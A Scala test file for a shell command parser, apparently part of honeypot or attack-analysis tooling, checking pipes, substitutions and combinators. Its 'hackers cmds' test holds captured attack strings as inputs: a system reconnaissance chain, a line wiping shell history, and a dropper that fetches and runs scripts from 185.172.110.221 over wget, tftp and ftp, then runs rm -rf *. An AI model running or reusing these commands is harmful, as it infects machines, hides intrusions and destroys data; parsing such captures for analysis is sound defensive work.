package io.rebelapps.ate.parsing

import io.rebelapps.ate.parsing._
import org.scalatest.{FlatSpec, Matchers}
import io.rebelapps.ate.parsing.CmdParser._

class CmdParserSpec extends FlatSpec with Matchers {

  "A cmd parser" should "parse simple cmd" in {
    parse("ls") shouldBe Right(Cmd("ls"))
    parse("start_tinc1.sh") shouldBe Right(Cmd("start_tinc1.sh"))
  }

  it should "parse simple cmd with arguments" in {
    parse("ls  -l") shouldBe Right(Cmd("ls", SimpleArgumentAst("-l")))
    parse("cd /tmp") shouldBe Right(Cmd("cd", SimpleArgumentAst("/tmp")))
    parse("ls  -l    -a") shouldBe Right(Cmd("ls", SimpleArgumentAst("-l"), SimpleArgumentAst("-a")))
    parse("wget     http://12.323.432.232/bin.sh") shouldBe Right(Cmd("wget", SimpleArgumentAst("http://12.323.432.232/bin.sh")))
    parse("""ls  -l    -a "*.txt"   """) shouldBe Right(Cmd("ls", SimpleArgumentAst("-l"), SimpleArgumentAst("-a"), DoubleQuoted("*.txt")))
    parse("""ls  -l    -a '*.txt'   """) shouldBe Right(Cmd("ls", SimpleArgumentAst("-l"), SimpleArgumentAst("-a"), SingleQuoted("*.txt")))
    parse("""ls  -l    -a "*.\"txt"   """) shouldBe Right(Cmd("ls", SimpleArgumentAst("-l"), SimpleArgumentAst("-a"), DoubleQuoted("*.\\\"txt")))
    parse("""ls  -l    -a '*.\'txt'   """) shouldBe Right(Cmd("ls", SimpleArgumentAst("-l"), SimpleArgumentAst("-a"), SingleQuoted("*.\\\'txt")))
  }

  it should "parse simple cmd with cmd substitution" in {
    parse("""ls  -l `cat test.txt`   """) shouldBe Right(Cmd("ls", SimpleArgumentAst("-l"), CmdSubstitution(Cmd("cat", SimpleArgumentAst("test.txt")))))
    parse("""ls  -l `echo "*.txt"`   """) shouldBe Right(Cmd("ls", SimpleArgumentAst("-l"), CmdSubstitution(Cmd("echo", DoubleQuoted("*.txt")))))
    parse("""ls  -l $(cat test.txt)   """) shouldBe Right(Cmd("ls", SimpleArgumentAst("-l"), CmdSubstitution(Cmd("cat", SimpleArgumentAst("test.txt")))))
    parse("""ls  -l $(echo "*.txt")   """) shouldBe Right(Cmd("ls", SimpleArgumentAst("-l"), CmdSubstitution(Cmd("echo", DoubleQuoted("*.txt")))))
    parse("""ls  -l $(ls /usr/bin/* | grep zip)   """) shouldBe Right(Cmd("ls", SimpleArgumentAst("-l"), CmdSubstitution(PipeCombinator(Cmd("ls", SimpleArgumentAst("/usr/bin/*")), Cmd("grep", SimpleArgumentAst("zip"))))))
    parse("""echo `uname` $USER test $PWD""") shouldBe Right(Cmd("echo", CmdSubstitution(Cmd("uname")), SimpleArgumentAst("$USER"), SimpleArgumentAst("test"), SimpleArgumentAst("$PWD")))
    parse("""echo $(uname) $USER test $PWD""") shouldBe Right(Cmd("echo", CmdSubstitution(Cmd("uname")), SimpleArgumentAst("$USER"), SimpleArgumentAst("test"), SimpleArgumentAst("$PWD")))
    parse("""echo `uname` | grep zip""") shouldBe Right(PipeCombinator(Cmd("echo",List(CmdSubstitution(Cmd("uname")))), Cmd("grep",List(SimpleArgumentAst("zip")))))
  }

  it should "parse compound cmds" in {
    parse("ls | grep zip") shouldBe Right(PipeCombinator(Cmd("ls"), Cmd("grep", SimpleArgumentAst("zip"))))
    parse("ls * | grep zip") shouldBe Right(PipeCombinator(Cmd("ls", SimpleArgumentAst("*")), Cmd("grep", SimpleArgumentAst("zip"))))
    parse("ls ; grep zip") shouldBe Right(ThenCombinator(Cmd("ls"), Cmd("grep", SimpleArgumentAst("zip"))))
    parse("ls && grep zip") shouldBe Right(AndCombinator(Cmd("ls"), Cmd("grep", SimpleArgumentAst("zip"))))
    parse("ls || grep zip") shouldBe Right(OrCombinator(Cmd("ls"), Cmd("grep", SimpleArgumentAst("zip"))))
    parse("ls| grep zip") shouldBe Right(PipeCombinator(Cmd("ls"), Cmd("grep", SimpleArgumentAst("zip"))))
    parse("ls; grep zip") shouldBe Right(ThenCombinator(Cmd("ls"), Cmd("grep", SimpleArgumentAst("zip"))))
    parse("ls&& grep zip") shouldBe Right(AndCombinator(Cmd("ls"), Cmd("grep", SimpleArgumentAst("zip"))))
    parse("ls|| grep zip") shouldBe Right(OrCombinator(Cmd("ls"), Cmd("grep", SimpleArgumentAst("zip"))))
    parse("ls && grep && cd") shouldBe Right(AndCombinator(Cmd("ls"), AndCombinator(Cmd("grep"), Cmd("cd"))))
    parse("ls | grep zip | grep test") shouldBe Right(PipeCombinator(Cmd("ls"), PipeCombinator(Cmd("grep", SimpleArgumentAst("zip")), Cmd("grep", SimpleArgumentAst("test")))))
    parse("ls | grep zip && grep test") shouldBe Right(PipeCombinator(Cmd("ls"), AndCombinator(Cmd("grep", SimpleArgumentAst("zip")), Cmd("grep", SimpleArgumentAst("test")))))
  }

  it should "parse hackers cmds" in {
    val cmd1 = "uname -a && echo RAM: && free -mt && echo && echo && echo Procesoare: && grep -c ^processor /proc/cpuinfo && echo && echo UPTIME: && uptime"
    parse(cmd1) should matchPattern { case Right(_) => }
    println(parse(cmd1))
    val cmd2 = "unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH ; history -n ; export HISTFILE=/dev/null ; export HISTSIZE=0; export HISTFILESIZE=0;"
    parse(cmd2) should matchPattern { case Right(_) => }
    println(parse(cmd2))
    val cmd3 = """cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.172.110.221/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 185.172.110.221 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.172.110.221; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.172.110.221 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *"""
    parse(cmd3) should matchPattern { case Right(_) => }
    println(parse(cmd3))
  }

}
